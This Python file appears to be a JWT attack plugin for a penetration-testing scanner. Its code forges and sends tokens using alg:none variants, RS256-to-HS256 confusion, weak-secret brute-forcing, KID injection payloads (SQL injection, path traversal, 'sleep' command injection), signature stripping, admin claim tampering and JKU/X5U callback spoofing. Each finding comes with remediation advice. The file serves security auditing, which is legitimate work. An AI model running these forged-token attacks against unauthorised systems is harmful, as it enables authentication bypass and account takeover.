"""JWT token vulnerability detection — jwt_tool level comprehensive audit.

Attack surface coverage:
1. Algorithm none bypass (none/None/NONE/nOnE variants)
2. Algorithm confusion (RS256 -> HS256 with public key)
3. KID injection (SQLi, path traversal, command injection)
4. JKU/X5U spoofing via CallbackServer
5. Weak secret brute-force from PayloadEngine JWT wordlist
6. Claim tampering (sub, role, admin, exp)
7. Signature stripping (empty signature section)
8. Token structure analysis (decode header/payload, check claims)
9. JWKS endpoint discovery
10. Expired token acceptance
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import re
import time
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

JWT_PATTERN = re.compile(
    r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*"
)

SCAN_PAGES = [
    "/", "/api/", "/api/v1/", "/api/v2/", "/login", "/auth",
    "/auth/login", "/dashboard", "/profile", "/me", "/user",
    "/graphql", "/token", "/oauth/token",
]

JWKS_PATHS = [
    "/.well-known/jwks.json",
    "/jwks.json",
    "/.well-known/openid-configuration",
    "/oauth/discovery/keys",
    "/auth/realms/master/protocol/openid-connect/certs",
]

# Algorithm none variants
ALG_NONE_VARIANTS = [
    "none", "None", "NONE", "nOnE", "NoNe", "nonE",
    "nONE", "NONe", "noNe", "nOne",
    "none\x00", "None\x00", "NONE\x00",
    "none ", " none", "none\t",
    "nONe", "NonE", "noNE",
]

# API paths to test forged tokens against
AUTH_PATHS = ["/api/", "/api/v1/", "/api/v2/", "/dashboard", "/me", "/profile", "/admin"]

# Default fallback weak secrets
FALLBACK_WEAK_SECRETS = [
    "secret", "password", "123456", "key", "admin",
    "test", "jwt_secret", "changeme", "default",
    "your-256-bit-secret", "supersecret", "s3cr3t",
    "", "qwerty", "iloveyou", "1234567890",
    "abc123", "monkey", "master", "dragon",
    "login", "princess", "football", "shadow",
    "jwt", "token", "HS256", "auth",
    "changeit", "letmein", "welcome", "trustno1",
    "my-secret-key", "super_secret", "token-secret",
    "JWT_SECRET", "mysecret", "secretkey",
    "s3cret", "passw0rd", "12345678", "pass",
    "access", "private", "public", "hmac_secret",
    "jwt-secret", "jwt_key", "signing_key",
    "api_secret", "app_secret", "client_secret",
    "server_secret", "node_secret", "express_secret",
    "flask_secret", "django_secret", "rails_secret",
    "spring_secret", "laravel_secret", "secret123",
    "password123", "topsecret", "notsecret",
    "keyboard", "baseball", "654321", "000000",
    "mypassword", "hunter2", "P@ssw0rd",
]

# KID injection payloads (SQL injection, path traversal, command injection)
KID_INJECTION_PAYLOADS: list[tuple[str, str, str]] = [
    # Path traversal to /dev/null (empty key)
    ("../../dev/null", "", "Path traversal to /dev/null (empty key)"),
    ("/dev/null", "", "Absolute path to /dev/null (empty key)"),
    ("../../../dev/null", "", "Deep traversal to /dev/null"),
    ("../../../../../../dev/null", "", "Very deep traversal to /dev/null"),
    # Path traversal to known empty/short files
    ("/proc/sys/kernel/randomize_va_space", "", "Traversal to proc pseudo-file"),
    # SQL injection via kid
    (
        "' UNION SELECT 'basilisk_secret' -- ",
        "basilisk_secret",
        "SQL injection to extract known key",
    ),
    (
        "' UNION SELECT '' -- ",
        "",
        "SQL injection to extract empty key",
    ),
    (
        "' OR '1'='1",
        "",
        "SQL injection boolean bypass",
    ),
    (
        "'; SELECT 'basilisk_secret' --",
        "basilisk_secret",
        "SQL injection stacked query",
    ),
    # Null kid
    ("", "", "Null/empty kid value"),
    ("null", "", "Literal null kid"),
    # Command injection via kid
    ("| sleep 5", "", "Command injection via pipe"),
    ("; sleep 5", "", "Command injection via semicolon"),
    ("$(sleep 5)", "", "Command injection via subshell"),
    # Path traversal to known files
    ("../../../../../../etc/hostname", "", "Path traversal to /etc/hostname"),
    ("....//....//....//dev/null", "", "Double-dot-slash traversal"),
    # Windows path traversal
    ("..\\..\\..\\..\\windows\\win.ini", "", "Windows path traversal"),
]

# JKU/X5U/JWK attack headers
JKU_X5U_HEADERS: list[tuple[str, str]] = [
    ("jku", "/.well-known/jwks.json"),
    ("x5u", "/x509.pem"),
    ("jwk", ""),
    ("x5c", ""),
]


# ---------------------------------------------------------------------------
# JWT utility functions
# ---------------------------------------------------------------------------

def _b64url_decode(data: str) -> bytes:
    """Decode base64url without padding."""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def _b64url_encode(data: bytes) -> str:
    """Encode to base64url without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _decode_jwt(token: str) -> tuple[dict, dict, str] | None:
    """Decode JWT header and payload (no signature verification)."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception as e:
        logger.debug("jwt_attack: %s", e)
        return None


def _forge_token(header: dict, payload: dict, signature: str = "") -> str:
    """Build a JWT from header, payload, and optional signature."""
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{signature}"


def _sign_hs(header_b64: str, payload_b64: str, secret: str, alg: str = "HS256") -> str:
    """Create HMAC signature for HS256/HS384/HS512."""
    hash_fn = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }.get(alg, hashlib.sha256)
    msg = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), msg, hash_fn).digest()
    return _b64url_encode(sig)


def _sign_hs256(header_b64: str, payload_b64: str, secret: str) -> str:
    """Create HMAC-SHA256 signature."""
    return _sign_hs(header_b64, payload_b64, secret, "HS256")


class JwtAttackPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="jwt_attack",
        display_name="JWT Attack",
        category=PluginCategory.PENTESTING,
        description=(
            "Comprehensive JWT audit: alg:none bypass, algorithm confusion, "
            "KID injection, JKU/X5U spoofing, weak secret brute-force, "
            "claim tampering, JWKS discovery"
        ),
        produces=["jwt_findings"],
        timeout=60.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available"
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        tested: list[dict] = []

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"jwt_tests": []},
            )

        # Phase 1: Discover JWT tokens
        tokens_found = await self._discover_tokens(ctx, base_url)
        if not tokens_found:
            # Also check JWKS endpoints for JWT infrastructure presence
            jwks_found = await self._discover_jwks(ctx, base_url, findings, tested)
            if not jwks_found:
                findings.append(Finding.info(
                    "No JWT tokens found in responses",
                    tags=["pentesting", "jwt"],
                ))
            return PluginResult.success(
                self.meta.name, target.host,
                findings=findings,
                data={"jwt_tests": tested, "tokens_found": 0},
            )

        # Phase 2: Analyze token structure
        for token in tokens_found[:5]:
            decoded = _decode_jwt(token)
            if decoded is None:
                continue

            header, payload, signature = decoded
            alg = header.get("alg", "")
            token_parts = token.split(".")

            self._analyze_token_structure(
                header, payload, alg, findings, tested,
            )

            # Phase 3: Algorithm none bypass
            if not ctx.should_stop:
                await self._attack_alg_none(
                    ctx, base_url, header, payload, token_parts,
                    alg, findings, tested,
                )

            # Phase 4: Weak secret brute-force
            if not ctx.should_stop and alg.startswith("HS"):
                self._attack_weak_secrets(
                    ctx, token_parts, header, payload, alg,
                    signature, findings, tested,
                )

            # Phase 5: Algorithm confusion (RS256 -> HS256)
            if not ctx.should_stop and alg.startswith("RS"):
                await self._attack_alg_confusion(
                    ctx, base_url, header, payload, token_parts,
                    findings, tested,
                )

            # Phase 6: KID injection
            if not ctx.should_stop and "kid" in header:
                await self._attack_kid_injection(
                    ctx, base_url, header, payload, findings, tested,
                )

            # Phase 7: Signature stripping
            if not ctx.should_stop:
                await self._attack_sig_strip(
                    ctx, base_url, token_parts, alg, findings, tested,
                )

            # Phase 8: Expired token acceptance
            if not ctx.should_stop:
                await self._check_expired_acceptance(
                    ctx, base_url, token, payload, findings, tested,
                )

            # Phase 9: Claim tampering
            if not ctx.should_stop and alg.startswith("HS"):
                await self._attack_claim_tamper(
                    ctx, base_url, header, payload, token_parts,
                    alg, signature, findings, tested,
                )

            # Phase 10: JKU/X5U spoofing via OOB
            if not ctx.should_stop and ctx.callback:
                await self._attack_jku_spoof(
                    ctx, base_url, target.host, header, payload,
                    findings, tested,
                )

        # Phase 11: JWKS endpoint discovery
        if not ctx.should_stop:
            await self._discover_jwks(ctx, base_url, findings, tested)

        if not findings:
            findings.append(Finding.info(
                f"JWT tokens found ({len(tokens_found)}) but no "
                f"vulnerabilities detected",
                tags=["pentesting", "jwt"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={
                "jwt_tests": tested,
                "tokens_found": len(tokens_found),
            },
        )

    # ------------------------------------------------------------------
    # Token discovery
    # ------------------------------------------------------------------

    async def _discover_tokens(
        self, ctx, base_url: str,
    ) -> list[str]:
        """Find JWT tokens in responses, cookies, and headers."""
        tokens: set[str] = set()

        for page in SCAN_PAGES:
            if ctx.should_stop:
                break
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(
                        f"{base_url}{page}", timeout=8.0,
                    )
                    body = await resp.text(encoding="utf-8", errors="replace")

                    # Response body
                    for match in JWT_PATTERN.finditer(body):
                        tokens.add(match.group())

                    # Cookies
                    for cookie_val in resp.headers.getall("Set-Cookie", []):
                        for match in JWT_PATTERN.finditer(cookie_val):
                            tokens.add(match.group())

                    # Auth-related headers
                    for hdr in (
                        "Authorization", "X-Auth-Token", "X-JWT",
                        "X-Access-Token", "X-CSRF-Token",
                    ):
                        val = resp.headers.get(hdr, "")
                        for match in JWT_PATTERN.finditer(val):
                            tokens.add(match.group())
            except Exception as e:
                logger.debug("jwt_attack: %s", e)
                continue

        return list(tokens)

    # ------------------------------------------------------------------
    # Token structure analysis
    # ------------------------------------------------------------------

    def _analyze_token_structure(
        self, header: dict, payload: dict, alg: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Analyze JWT claims for security issues."""
        issues: list[str] = []

        # Check missing claims
        missing_claims = []
        for claim in ("iss", "exp", "iat", "nbf"):
            if claim not in payload:
                missing_claims.append(claim)

        if missing_claims:
            issues.append(f"Missing claims: {', '.join(missing_claims)}")

        # Check weak algorithm
        if alg in ("HS256", "HS384", "HS512"):
            issues.append(
                f"Symmetric algorithm ({alg}) — vulnerable to brute-force"
            )

        # Check no algorithm
        if not alg or alg.lower() == "none":
            issues.append("Algorithm is 'none' — token is unsigned")

        # Check if token has sensitive data in payload
        sensitive_keys = [
            "password", "secret", "ssn", "credit_card", "cc",
        ]
        for key in payload:
            if key.lower() in sensitive_keys:
                issues.append(f"Sensitive claim in payload: {key}")

        # Check very long expiration
        exp = payload.get("exp")
        iat = payload.get("iat")
        if isinstance(exp, int | float) and isinstance(iat, int | float):
            lifetime = exp - iat
            if lifetime > 86400 * 30:  # > 30 days
                issues.append(
                    f"Very long token lifetime: {lifetime // 86400} days"
                )

        if issues:
            tested.append({
                "attack": "structure_analysis",
                "issues": issues,
            })
            severity = Finding.medium if len(issues) <= 2 else Finding.high
            if any("unsigned" in i.lower() for i in issues):
                severity = Finding.critical
            findings.append(severity(
                f"JWT structure issues: {len(issues)} concern(s)",
                description=(
                    "Token structure analysis revealed security concerns:\n"
                    + "\n".join(f"  - {i}" for i in issues)
                ),
                evidence=(
                    f"Algorithm: {alg}\n"
                    f"Header: {json.dumps(header)}\n"
                    f"Claims: {list(payload.keys())}\n"
                    f"Issues: {'; '.join(issues)}"
                ),
                remediation=(
                    "Include iss, exp, iat, and nbf claims. "
                    "Use asymmetric algorithms (RS256, ES256). "
                    "Set reasonable token lifetime. "
                    "Never store sensitive data in JWT payload."
                ),
                tags=["pentesting", "jwt", "auth"],
            ))

    # ------------------------------------------------------------------
    # Attack: Algorithm none bypass
    # ------------------------------------------------------------------

    async def _attack_alg_none(
        self, ctx, base_url: str,
        header: dict, payload: dict, token_parts: list[str],
        original_alg: str, findings: list[Finding], tested: list[dict],
    ) -> None:
        """Try alg:none bypass with multiple case variants."""
        for none_variant in ALG_NONE_VARIANTS:
            if ctx.should_stop:
                break

            forged_header = {**header, "alg": none_variant, "typ": "JWT"}
            forged_token = _forge_token(forged_header, payload, "")

            accepted = await self._test_token_acceptance(
                ctx, base_url, forged_token,
            )
            if accepted:
                tested.append({
                    "attack": "alg_none",
                    "variant": none_variant,
                    "success": True,
                })
                findings.append(Finding.critical(
                    f"JWT alg:none bypass accepted (variant: {none_variant})",
                    description=(
                        f"Server accepts JWT tokens with algorithm set to "
                        f"'{none_variant}', allowing complete signature bypass. "
                        f"An attacker can forge arbitrary tokens."
                    ),
                    evidence=(
                        f"Original alg: {original_alg}\n"
                        f"Forged header: {json.dumps(forged_header)}\n"
                        f"Accepted with status 2xx"
                    ),
                    remediation=(
                        "Explicitly validate the 'alg' field. "
                        "Reject 'none' algorithm in all case variants. "
                        "Use an allowlist of accepted algorithms."
                    ),
                    tags=["pentesting", "jwt", "auth", "critical"],
                ))
                return

    # ------------------------------------------------------------------
    # Attack: Weak secret brute-force
    # ------------------------------------------------------------------

    def _attack_weak_secrets(
        self, ctx, token_parts: list[str],
        header: dict, payload: dict, alg: str,
        original_sig: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Brute-force HMAC secrets from PayloadEngine + fallback list."""
        # Collect secrets from PayloadEngine
        secrets_to_try: list[str] = []
        if ctx.payloads:
            from basilisk.utils.payloads import PayloadCategory
            jwt_payloads = ctx.payloads.get(PayloadCategory.JWT)
            for p in jwt_payloads:
                if "brute" in p.tags:
                    secrets_to_try.append(p.value)

        # Add fallback secrets not already in list
        for s in FALLBACK_WEAK_SECRETS:
            if s not in secrets_to_try:
                secrets_to_try.append(s)

        for secret in secrets_to_try:
            expected_sig = _sign_hs(
                token_parts[0], token_parts[1], secret, alg,
            )
            if expected_sig == original_sig:
                tested.append({
                    "attack": "weak_secret",
                    "secret": secret if secret else "(empty)",
                })
                findings.append(Finding.critical(
                    f"JWT signed with weak secret: "
                    f"'{secret if secret else '(empty)'}'"
                    ,
                    description=(
                        "JWT token is signed with a commonly used weak "
                        "secret. An attacker can forge arbitrary tokens "
                        "with full control over all claims."
                    ),
                    evidence=(
                        f"Algorithm: {alg}\n"
                        f"Secret found: {secret if secret else '(empty)'}\n"
                        f"Header: {json.dumps(header)}"
                    ),
                    remediation=(
                        "Use a strong, random secret (256+ bits). "
                        "Consider asymmetric algorithms (RS256, ES256). "
                        "Rotate secrets regularly."
                    ),
                    tags=["pentesting", "jwt", "auth", "weak-secret"],
                ))
                return

    # ------------------------------------------------------------------
    # Attack: Algorithm confusion (RS256 -> HS256)
    # ------------------------------------------------------------------

    async def _attack_alg_confusion(
        self, ctx, base_url: str,
        header: dict, payload: dict, token_parts: list[str],
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Try RS256->HS256 algorithm confusion attack.

        Requires knowing the public key. Attempts to discover it
        from JWKS endpoint, then signs with it as HMAC secret.
        """
        # Try to find public key from JWKS
        public_key = await self._fetch_public_key(ctx, base_url)
        if not public_key:
            tested.append({
                "attack": "alg_confusion",
                "note": "No public key discovered from JWKS",
            })
            return

        # Forge token with HS256 using public key as secret
        forged_header = {**header, "alg": "HS256"}
        h_b64 = _b64url_encode(
            json.dumps(forged_header, separators=(",", ":")).encode()
        )
        p_b64 = token_parts[1]
        sig = _sign_hs256(h_b64, p_b64, public_key)
        forged_token = f"{h_b64}.{p_b64}.{sig}"

        accepted = await self._test_token_acceptance(
            ctx, base_url, forged_token,
        )
        if accepted:
            tested.append({"attack": "alg_confusion", "success": True})
            findings.append(Finding.critical(
                "JWT algorithm confusion: RS256->HS256 accepted",
                description=(
                    "Server accepts HS256-signed tokens when RS256 is "
                    "expected. By using the public key as the HMAC secret, "
                    "an attacker can forge tokens without the private key."
                ),
                evidence=(
                    f"Original alg: {header.get('alg')}\n"
                    f"Forged alg: HS256\n"
                    f"Signed with public key as HMAC secret"
                ),
                remediation=(
                    "Enforce algorithm validation server-side. "
                    "Use an algorithm allowlist. "
                    "Never accept HMAC algorithms when RSA is configured."
                ),
                tags=["pentesting", "jwt", "auth", "alg-confusion"],
            ))

    # ------------------------------------------------------------------
    # Attack: KID injection
    # ------------------------------------------------------------------

    async def _attack_kid_injection(
        self, ctx, base_url: str,
        header: dict, payload: dict,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Test KID header for SQLi, path traversal, command injection."""
        kid_payloads: list[tuple[str, str, str]] = list(KID_INJECTION_PAYLOADS)

        # Add KID payloads from PayloadEngine
        if ctx.payloads:
            from basilisk.utils.payloads import PayloadCategory
            for p in ctx.payloads.get(PayloadCategory.JWT):
                if "kid_injection" in p.tags:
                    try:
                        kid_header = json.loads(p.value)
                        kid_val = kid_header.get("kid", "")
                        if kid_val:
                            kid_payloads.append(
                                (kid_val, "", p.description)
                            )
                    except (json.JSONDecodeError, TypeError):
                        pass

        for kid_val, signing_secret, desc in kid_payloads[:8]:
            if ctx.should_stop:
                break

            forged_header = {**header, "alg": "HS256", "kid": kid_val}
            h_b64 = _b64url_encode(
                json.dumps(forged_header, separators=(",", ":")).encode()
            )
            p_b64 = _b64url_encode(
                json.dumps(payload, separators=(",", ":")).encode()
            )
            sig = _sign_hs256(h_b64, p_b64, signing_secret)
            forged_token = f"{h_b64}.{p_b64}.{sig}"

            accepted = await self._test_token_acceptance(
                ctx, base_url, forged_token,
            )
            if accepted:
                tested.append({
                    "attack": "kid_injection",
                    "kid": kid_val,
                    "desc": desc,
                    "success": True,
                })
                findings.append(Finding.critical(
                    f"JWT KID injection: {desc}",
                    description=(
                        f"Server accepted a token with a manipulated 'kid' "
                        f"header parameter. KID value: '{kid_val}'. "
                        f"This allows an attacker to control the signing key."
                    ),
                    evidence=(
                        f"KID value: {kid_val}\n"
                        f"Signing secret: '{signing_secret}'\n"
                        f"Attack: {desc}"
                    ),
                    remediation=(
                        "Validate and sanitize the 'kid' parameter. "
                        "Use an allowlist of key identifiers. "
                        "Never use 'kid' in file paths or SQL queries."
                    ),
                    tags=["pentesting", "jwt", "auth", "kid-injection"],
                ))
                return

    # ------------------------------------------------------------------
    # Attack: Signature stripping
    # ------------------------------------------------------------------

    async def _attack_sig_strip(
        self, ctx, base_url: str,
        token_parts: list[str], alg: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Send token with empty signature section."""
        stripped_token = f"{token_parts[0]}.{token_parts[1]}."

        accepted = await self._test_token_acceptance(
            ctx, base_url, stripped_token,
        )
        if accepted:
            tested.append({"attack": "sig_strip", "success": True})
            findings.append(Finding.critical(
                "JWT with empty signature accepted",
                description=(
                    "Server accepts JWT tokens with an empty signature. "
                    "This effectively means no signature verification."
                ),
                evidence=(
                    f"Original alg: {alg}\n"
                    f"Token sent without signature\n"
                    f"Accepted with status 2xx"
                ),
                remediation=(
                    "Always verify JWT signatures server-side. "
                    "Reject tokens with empty or missing signatures."
                ),
                tags=["pentesting", "jwt", "auth", "sig-strip"],
            ))

    # ------------------------------------------------------------------
    # Attack: Expired token acceptance
    # ------------------------------------------------------------------

    async def _check_expired_acceptance(
        self, ctx, base_url: str,
        token: str, payload: dict,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Check if expired tokens are still accepted."""
        exp = payload.get("exp")
        if not isinstance(exp, int | float):
            return
        if exp >= time.time():
            return  # Token not expired

        accepted = await self._test_token_acceptance(
            ctx, base_url, token,
        )
        if accepted:
            age = int(time.time() - exp)
            tested.append({"attack": "expired_accepted", "expired_for": age})
            findings.append(Finding.high(
                "Expired JWT token accepted by server",
                description=(
                    f"Server accepts JWT tokens past their expiration. "
                    f"Token expired {age}s ago."
                ),
                evidence=(
                    f"Token exp: {exp} (expired {age}s ago)\n"
                    f"Accepted with status 2xx"
                ),
                remediation=(
                    "Validate the 'exp' claim server-side on every request. "
                    "Implement token refresh flow. Set reasonable expiration."
                ),
                tags=["pentesting", "jwt", "auth"],
            ))

    # ------------------------------------------------------------------
    # Attack: Claim tampering
    # ------------------------------------------------------------------

    async def _attack_claim_tamper(
        self, ctx, base_url: str,
        header: dict, payload: dict, token_parts: list[str],
        alg: str, original_sig: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Test claim tampering attacks (requires known weak secret)."""
        # Only effective if we already found the secret
        known_secret = None
        for t in tested:
            if t.get("attack") == "weak_secret" and t.get("secret") is not None:
                known_secret = t["secret"]
                break

        if known_secret is None:
            return

        tamper_payloads: list[tuple[dict, str]] = [
            ({"sub": "admin", "role": "admin"}, "Admin role escalation"),
            ({"admin": True}, "Admin flag injection"),
            ({"role": "superadmin"}, "Superadmin role injection"),
            ({"exp": 9999999999}, "Far-future expiry"),
            ({"iss": "self"}, "Issuer spoofing"),
        ]

        for claims_override, desc in tamper_payloads:
            if ctx.should_stop:
                break

            tampered_payload = {**payload, **claims_override}
            h_b64 = token_parts[0]
            p_b64 = _b64url_encode(
                json.dumps(tampered_payload, separators=(",", ":")).encode()
            )
            sig = _sign_hs(h_b64, p_b64, known_secret, alg)
            forged_token = f"{h_b64}.{p_b64}.{sig}"

            accepted = await self._test_token_acceptance(
                ctx, base_url, forged_token,
            )
            if accepted:
                tested.append({
                    "attack": "claim_tamper",
                    "claims": claims_override,
                    "desc": desc,
                    "success": True,
                })
                findings.append(Finding.critical(
                    f"JWT claim tampering: {desc}",
                    description=(
                        f"Forged token with modified claims accepted. "
                        f"Modified claims: {json.dumps(claims_override)}. "
                        f"Combined with weak secret, this allows full "
                        f"account takeover."
                    ),
                    evidence=(
                        f"Modified claims: {json.dumps(claims_override)}\n"
                        f"Signed with cracked secret\n"
                        f"Accepted with status 2xx"
                    ),
                    remediation=(
                        "Use strong secrets. Validate all claims server-side. "
                        "Implement proper authorization beyond JWT claims."
                    ),
                    tags=["pentesting", "jwt", "auth", "claim-tamper"],
                ))
                return  # One is enough to prove the issue

    # ------------------------------------------------------------------
    # Attack: JKU/X5U spoofing
    # ------------------------------------------------------------------

    async def _attack_jku_spoof(
        self, ctx, base_url: str, host: str,
        header: dict, payload: dict,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Test JKU/X5U header spoofing via OOB callback."""
        import asyncio

        spoof_params: list[tuple[str, str]] = [
            (name, path_suffix)
            for name, path_suffix in JKU_X5U_HEADERS
            if path_suffix  # Only test params that have URL paths
        ]

        tokens_sent: list[tuple[str, str]] = []

        for param_name, path_suffix in spoof_params:
            if ctx.should_stop:
                break

            token = ctx.callback.generate_token(
                self.meta.name, host, f"jwt_{param_name}_spoof",
                description=f"JWT {param_name} URL spoofing",
            )
            callback_url = ctx.callback.build_payload_url(token, path_suffix)

            forged_header = {
                **header,
                "alg": header.get("alg", "RS256"),
                param_name: callback_url,
            }
            forged_token = _forge_token(forged_header, payload, "")

            # Send forged token to multiple endpoints
            for auth_path in AUTH_PATHS[:3]:
                if ctx.should_stop:
                    break
                try:
                    async with ctx.rate:
                        await ctx.http.get(
                            f"{base_url}{auth_path}",
                            headers={"Authorization": f"Bearer {forged_token}"},
                            timeout=8.0,
                        )
                except Exception as e:
                    logger.debug("jwt_attack: %s", e)

            tokens_sent.append((token, param_name))

        # Wait for OOB callbacks
        if tokens_sent:
            await asyncio.sleep(3)
            for cb_token, param_name in tokens_sent:
                if ctx.callback.has_callback(cb_token):
                    tested.append({
                        "attack": f"{param_name}_spoof",
                        "success": True,
                    })
                    findings.append(Finding.critical(
                        f"JWT {param_name.upper()} spoofing: server fetched attacker URL",
                        description=(
                            f"Server fetched the attacker-controlled "
                            f"{param_name.upper()} URL from the JWT header. "
                            f"An attacker can supply their own signing keys "
                            f"to forge valid tokens."
                        ),
                        evidence=(
                            f"OOB callback received for {param_name} spoofing\n"
                            f"Token: {cb_token}"
                        ),
                        remediation=(
                            f"Validate {param_name.upper()} URLs against an "
                            f"allowlist. Pin trusted key sources. "
                            f"Never fetch keys from untrusted URLs."
                        ),
                        tags=["pentesting", "jwt", "auth", f"{param_name}-spoof"],
                    ))

    # ------------------------------------------------------------------
    # JWKS endpoint discovery
    # ------------------------------------------------------------------

    async def _discover_jwks(
        self, ctx, base_url: str,
        findings: list[Finding], tested: list[dict],
    ) -> bool:
        """Check for JWKS endpoints and extract key metadata."""
        found = False

        for path in JWKS_PATHS:
            if ctx.should_stop:
                break
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(
                        f"{base_url}{path}", timeout=5.0,
                    )
                    if resp.status != 200:
                        continue

                    body = await resp.text(encoding="utf-8", errors="replace")
                    body_stripped = body.strip()

                    # Check for JWKS structure
                    if '"keys"' in body and body_stripped.startswith("{"):
                        try:
                            jwks_data = json.loads(body)
                            keys = jwks_data.get("keys", [])
                            if keys:
                                found = True
                                key_summary = []
                                for key in keys[:5]:
                                    kty = key.get("kty", "?")
                                    alg = key.get("alg", "?")
                                    kid = key.get("kid", "?")
                                    key_summary.append(
                                        f"kty={kty} alg={alg} kid={kid}"
                                    )

                                tested.append({
                                    "type": "jwks_discovery",
                                    "path": path,
                                    "keys_found": len(keys),
                                })
                                findings.append(Finding.info(
                                    f"JWKS endpoint found: {path} "
                                    f"({len(keys)} keys)",
                                    description=(
                                        f"JSON Web Key Set accessible at {path}. "
                                        f"Keys: {'; '.join(key_summary)}"
                                    ),
                                    evidence=body[:500],
                                    tags=["pentesting", "jwt", "jwks"],
                                ))
                        except json.JSONDecodeError:
                            pass

                    # Check for OpenID configuration
                    elif "openid" in path and '"jwks_uri"' in body:
                        found = True
                        tested.append({
                            "type": "openid_config",
                            "path": path,
                        })
                        findings.append(Finding.info(
                            f"OpenID configuration found: {path}",
                            description=(
                                "OpenID Connect configuration accessible."
                            ),
                            evidence=body[:500],
                            tags=["pentesting", "jwt", "openid"],
                        ))

            except Exception as e:
                logger.debug("jwt_attack: %s", e)
                continue

        return found

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    async def _test_token_acceptance(
        self, ctx, base_url: str, token: str,
    ) -> bool:
        """Test if a JWT token is accepted by the server (returns 2xx)."""
        for path in AUTH_PATHS[:3]:
            if ctx.should_stop:
                break
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(
                        f"{base_url}{path}",
                        headers={"Authorization": f"Bearer {token}"},
                        timeout=8.0,
                    )
                    if resp.status in (200, 201, 204):
                        return True
            except Exception as e:
                logger.debug("jwt_attack: %s", e)
                continue
        return False

    async def _fetch_public_key(
        self, ctx, base_url: str,
    ) -> str | None:
        """Try to discover a public key from JWKS endpoint."""
        for path in JWKS_PATHS[:3]:
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(
                        f"{base_url}{path}", timeout=5.0,
                    )
                    if resp.status != 200:
                        continue
                    body = await resp.text(encoding="utf-8", errors="replace")
                    data = json.loads(body)

                    keys = data.get("keys", [])
                    for key in keys:
                        # Look for RSA keys with the 'n' (modulus) field
                        if key.get("kty") == "RSA" and "n" in key:
                            # Return the raw JWKS key as a string for
                            # HMAC signing (algorithm confusion)
                            return json.dumps(key, separators=(",", ":"))
            except Exception as e:
                logger.debug("jwt_attack: %s", e)
                continue
        return None
